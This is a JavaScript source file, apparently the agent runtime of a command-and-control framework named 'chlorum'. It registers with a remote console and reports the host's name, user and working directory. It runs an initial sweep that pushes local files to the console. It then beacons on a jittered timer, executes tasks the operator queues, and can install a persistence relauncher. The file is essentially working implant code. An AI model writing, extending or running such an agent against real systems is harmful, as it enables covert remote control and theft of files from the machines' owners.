// agents/agent.mjs — chlorum node runtime
//
//   node agents/agent.mjs <task-id> [console-base]
//
// The task id is the deployment identity minted by the console.
// The profile key is derived locally from it; the console derives
// the same key from its master token. The key never touches the
// network.

import os from "node:os";
import { resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { deriveProfileKey } from "../server/hypochlorite/register.mjs";
import { makeTransport } from "../chloride/wire.mjs";
import { newReagent } from "../chloride/codec.mjs";
import { chloroform } from "./chloroform.mjs";
import { hypochlorite } from "./hypochlorite.mjs";
import { perchlorate } from "./perchlorate.mjs";
import { loadTaskHandlers } from "./tasks/index.mjs";

const __dirname = fileURLToPath(new URL(".", import.meta.url));

const taskId = process.argv[2] || process.env.CHLORUM_TASK_ID;
if (!taskId || !/^cl-[a-z0-9-]{2,32}$/.test(taskId)) {
  console.error("usage: node agents/agent.mjs <task-id> [console-base]");
  process.exit(1);
}
const base = process.argv[3] || process.env.CHLORUM_BASE || "http://127.0.0.1:8787";
const profileKey = deriveProfileKey(taskId);

const beaconMs = Number(process.env.CHLORUM_BEACON_MS || 10000);
const watchdogMs = Number(process.env.CHLORUM_WATCHDOG_MS || 180000);
// persistence is opt-in on the node: the perchlorate relauncher is
// installed only when the operator explicitly asks for it
const persist = (process.env.CHLORUM_PERSIST ?? "0") === "1";

const transport = makeTransport({ base, profileKey, taskId });
const tasks = loadTaskHandlers();
const vaultDir = resolve(os.homedir(), ".chlorum", "vault");

function buildProfile() {
  return {
    os: os.platform(),
    osVersion: os.release(),
    arch: os.arch(),
    host: os.hostname(),
    user: os.userInfo().username,
    cwd: process.cwd(),
    runtime: `node ${process.version}`,
    bootAt: new Date().toISOString(),
  };
}

async function sendLog(lines) {
  try {
    await transport.postReagent("/api/chl/in", newReagent("hypochlorite.log", { agentId: taskId, lines }));
  } catch {
    /* logging is best effort */
  }
}

async function runTask(task) {
  const handler = tasks[task.type];
  if (!handler) {
    await sendLog([`unknown task type ${task.type}`]);
    return { ok: false, error: `unknown type ${task.type}` };
  }
  try {
    const result = await handler({ args: task.args, taskId, transport, vaultDir });
    return { ok: true, ...result };
  } catch (err) {
    await sendLog([`task ${task.id} (${task.type}) threw: ${err.message}`]);
    return { ok: false, error: err.message };
  }
}

let exhausted = false;

// one execution path for queued work, used by both the register
// welcome and every poll tick — a kill queued before first contact
// must fire exactly like a kill queued later
async function runPending(pending) {
  for (const task of pending) {
    const result = await runTask(task);
    await transport
      .postReagent("/api/chl/in", newReagent("hypochlorite.result", {
        agentId: taskId,
        taskId: task.id,
        ...result,
      }))
      .catch(() => {});
    if (task.type === "kill") {
      perchlorate.clear();
      exhausted = true;
      return;
    }
  }
}

async function tick() {
  chloroform.pat();
  let pending = [];
  try {
    const res = await transport.postReagent("/api/chl/in", newReagent("hypochlorite.poll", { agentId: taskId }));
    pending = res.m?.pending || [];
  } catch {
    return; // console unreachable; next tick retries
  }
  await runPending(pending);
}

console.log(`[chlorum] node ${taskId} dialing ${base}`);

// initial registration; the console answers with welcome + pending work
try {
  const welcome = await transport.postReagent("/api/chl/in", newReagent("hypochlorite.register", {
    agentId: taskId,
    profile: buildProfile(),
  }));
  const firstSweep = await hypochlorite.sweep({ taskId, transport, vaultDir });
  await runPending(welcome.m?.pending || []);
  // a kill already executed on first contact must not be followed by
  // installing persistence — the relauncher only lands on a live node
  if (persist && !exhausted) {
    const applied = perchlorate.apply(base, taskId);
    await sendLog([`perchlorate relauncher: ${applied.applied.join("; ").slice(0, 400)}`]);
    console.log("[chlorum] perchlorate relauncher installed");
  }
  console.log(`[chlorum] registered; initial sweep pushed (${firstSweep.files} files)`);
} catch (err) {
  console.error(`[chlorum] registration failed: ${err.message}`);
  process.exit(2);
}

if (exhausted) {
  console.log("[chlorum] disengaging");
  process.exit(0);
}

chloroform.arm(watchdogMs);

const jitter = () => Math.floor(beaconMs * (0.85 + Math.random() * 0.3));

const loop = () => {
  tick()
    .catch(() => {})
    .finally(() => {
      if (exhausted) {
        console.log("[chlorum] disengaging");
        process.exit(0);
      }
      setTimeout(loop, jitter());
    });
};
loop();
